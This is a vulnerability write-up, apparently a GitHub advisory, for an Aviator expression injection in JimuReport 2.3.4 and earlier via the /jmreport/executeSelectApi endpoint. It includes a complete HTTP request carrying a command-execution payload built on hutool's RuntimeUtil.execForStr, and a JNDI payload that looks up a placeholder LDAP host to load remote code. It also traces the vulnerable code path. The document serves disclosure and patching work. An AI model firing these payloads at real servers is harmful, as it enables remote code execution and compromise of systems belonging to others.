# jimureport aviator expression injection (≤ v2.3.4)

**Product**: jimureport

**Affected Versions**: ≤ v2.3.4

**address**: https://github.com/jeecgboot/jimureport

## Vulnerability Description

JimuReport versions 2.3.4 and below at `/jmreport/executeSelectApi` API do not effectively restrict user input, directly delegating it to the `execute` method of the aviator expression, which leads to aviator expression injection.

## POC

Vulnerable interface front-end location:

<img width="1050" height="752" alt="image" src="https://github.com/user-attachments/assets/c50c9216-10d2-4ceb-bb58-6763d059c120" />


The vulnerability is triggered by entering arbitrary report parameters and then clicking the API parsing button.

<img width="1905" height="866" alt="image" src="https://github.com/user-attachments/assets/97bada2c-d7e9-4c99-accd-ea4b9bf38018" />


The vulnerability lies in the paramValue parameter, which, under certain conditions, can parse aviator expressions.

```http
POST /jmreport/executeSelectApi?token=1d478d2b-0e8e-45dc-9c5c-cbdea71173c2 HTTP/1.1
Host: 192.168.239.1:8085
Content-Length: 505
tenantId: null
X-TIMESTAMP: 1780971264913
X-Access-Token: 1d478d2b-0e8e-45dc-9c5c-cbdea71173c2
X-Sign: DD0F6865D5F752F96B51B72EB56FFD5E
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
X-Tenant-Id: null
token: 1d478d2b-0e8e-45dc-9c5c-cbdea71173c2
JmReport-Tenant-Id: null
Origin: http://192.168.239.1:8085
Referer: http://192.168.239.1:8085/doLogin?username=admin&password=123456
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

api=http%3A%2F%2F127.0.0.1%2Faaa&method=0&apiConvert=&paramArray=%5B%7B%22paramName%22%3A%22test%22%2C%22paramTxt%22%3A%22123%22%2C%22paramValue%22%3A%22%3Duse%20cn.hutool.core.util.%2A%3BRuntimeUtil.execForStr%28seq.array%28java.lang.String%2C%20%5C%22calc%5C%22%29%29%22%2C%22orderNum%22%3A1%2C%22tableIndex%22%3A1%2C%22extJson%22%3A%22%22%2C%22dictCode%22%3A%22utf-8%22%2C%22_index%22%3A0%2C%22_rowKey%22%3A12%2C%22widgetType%22%3A%22number%22%2C%22searchMode%22%3A1%2C%22searchFormat%22%3A%22111%22%7D%5D
```
Two payloads can be used: one based on JNDI injection, and the other loading the command execution method that comes with hutool.

```java
=use javax.naming.*;InitialContext.doLookup("ldap://x.x.x.x:x/exp")
```

Use java-chains to generate DruidJdbcAttack-H2 command execution chains.
https://github.com/vulhub/java-chains
<img width="1549" height="626" alt="image" src="https://github.com/user-attachments/assets/d86516b8-2259-4785-8fc5-eb2fb93edf3f" />

<img width="1872" height="855" alt="image" src="https://github.com/user-attachments/assets/8ceb93b4-09d0-4ea8-aaee-e1a4a69f64e9" />


```java
=use cn.hutool.core.util.*;RuntimeUtil.execForStr(seq.array(java.lang.String, "calc"))
```
Because of the hutool-core dependency, the built-in `RuntimeUtil.execForStr` method can be used to execute commands.

<img width="1875" height="852" alt="image" src="https://github.com/user-attachments/assets/5e01511e-ba95-4ac3-a188-cb9b85e6cef6" />



## code

The vulnerability in the `/jmreport/executeSelectApi` interface, located in `org.jeecg.modules.jmreport.desreport.b.a`.

The mapping receives the paramArray parameter and then calls the executeSelectApi method.

<img width="1206" height="547" alt="image" src="https://github.com/user-attachments/assets/0ae06f7f-2a72-4c4e-8376-502ab88f9ab7" />

Entering the if condition, method a is called.

<img width="1223" height="771" alt="image" src="https://github.com/user-attachments/assets/89e9cd69-09d1-4e9e-8b03-fac0af29c7b6" />

Then, the JSON is parsed, the paramValue parameter is extracted, enter the second if, and the ExpressUtil.a() method is called.

<img width="1203" height="781" alt="image" src="https://github.com/user-attachments/assets/944a3153-4347-408d-8960-106ab1b98e50" />

Entering the ExpressUtil.a method, we find that it calls the exp.execute method, and the object exp is compiled using the key parameter.

According to the code, the parameter `expression` is controllable; the only difference between it and the parameter `key` is the replacement of the equals sign.

It's also important to note that the condition `expression.startsWith("=")` must be true for the subsequent logic to proceed.Therefore, an equal sign was added at the beginning of the payload.

<img width="1066" height="789" alt="image" src="https://github.com/user-attachments/assets/f6f9e5b2-3437-47a8-ab94-4537e98c2dde" />
